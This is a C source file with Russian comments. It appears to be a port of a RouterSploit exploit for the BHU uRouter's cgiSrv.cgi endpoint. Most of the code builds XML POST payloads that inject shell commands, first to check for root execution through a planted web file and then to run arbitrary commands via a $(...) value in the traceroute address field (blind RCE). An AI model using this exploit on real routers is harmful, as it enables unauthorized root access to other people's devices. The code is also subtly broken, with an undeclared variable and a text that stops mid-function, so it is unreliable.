// "BHU uRouter

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define BUFFER_SIZE 4096

void send_request(int sock, const char *request) {
    send(sock, request, strlen(request), 0);
}

int check_vulnerability(int sock) {
    char buffer[BUFFER_SIZE];
    const char *check_cmd = "<cmd><ITEM cmd=\"echo \\\"$USER\\\"\" addr=\"&gt; /usr/share/www/routersploit.check\" /></cmd>";
    const char *headers = "Content-Type: text/xml\r\nX-Requested-With: XMLHttpRequest\r\n";
    
    // Создание запроса
    char request[BUFFER_SIZE];
    snprintf(request, sizeof(request),
             "POST /cgi-bin/cgiSrv.cgi HTTP/1.1\r\n"
             "Host: target_ip\r\n" // Замените на IP-адрес целевого устройства
             "%s"
             "Content-Length: %lu\r\n\r\n"
             "%s",
             headers, strlen(check_cmd), check_cmd);
    
    // Отправка запроса
    send_request(sock, request);
    
    // Чтение ответа
    recv(sock, buffer, sizeof(buffer) - 1, 0);
    buffer[BUFFER_SIZE - 1] = '\0'; // Обеспечиваем нуль-терминатор

    // Проверка на наличие "status=\"doing\""
    if (strstr(buffer, "status=\"doing\"") == NULL) {
        return 0; // Уязвимость не найдена
    }

    // Проверка на создание файла
    char check_file[BUFFER_SIZE];
    snprintf(check_file, sizeof(check_file), "GET /routersploit.check HTTP/1.1\r\nHost: target_ip\r\nConnection: close\r\n\r\n", target_ip);
    send_request(sock, check_file);
    
    recv(sock, buffer, sizeof(buffer) - 1, 0);
    buffer[BUFFER_SIZE - 1] = '\0'; // Обеспечиваем нуль-терминатор

    // Проверка на наличие "root" в ответе
    if (strstr(buffer, "root") == NULL) {
        return 0; // Уязвимость не найдена
    }

    // Удаление временного файла
    const char *remove_cmd = "<cmd><ITEM cmd=\"rm -f /usr/share/www/routersploit.check\" /></cmd>";
    snprintf(request, sizeof(request),
             "POST /cgi-bin/cgiSrv.cgi HTTP/1.1\r\n"
             "Host: target_ip\r\n" // Замените на IP-адрес целевого устройства
             "%s"
             "Content-Length: %lu\r\n\r\n"
             "%s",
             headers, strlen(remove_cmd), remove_cmd);
    
    send_request(sock, request);

    return 1; // Уязвимость найдена
}

void execute_command(int sock, const char *cmd) {
    char buffer[BUFFER_SIZE];
    const char *headers = "Content-Type: text/xml\r\nX-Requested-With: XMLHttpRequest\r\n";
    
    // Формирование команды
    char command[BUFFER_SIZE];
    snprintf(command, sizeof(command),
             "<cmd><ITEM cmd=\"traceroute\" addr=\"$(%s)\" /></cmd>", cmd);
    
    // Создание запроса
    char request[BUFFER_SIZE];
    snprintf(request, sizeof(request),
             "POST /cgi-bin/cgiSrv.cgi HTTP/1.1\r\n"
             "Host: target_ip\r\n" // Замените на IP-адрес целевого устройства
             "%s"
             "Content-Length: %lu\r\n\r\n"
             "%s",
             headers, strlen(command), command);
    
    // Отправка запроса
    send_request(sock, request);
    
    // Слепая RCE, поэтому нет ответа
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <target_ip> <port>\n", argv[0]);
        return EXIT_FAILURE;
    }

    const char *target_ip = argv[1];
    int port = atoi(argv[2]);

    int sock;
    struct sockaddr_in server_addr;

    // Создание сокета
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return EXIT_FAILURE;
    }
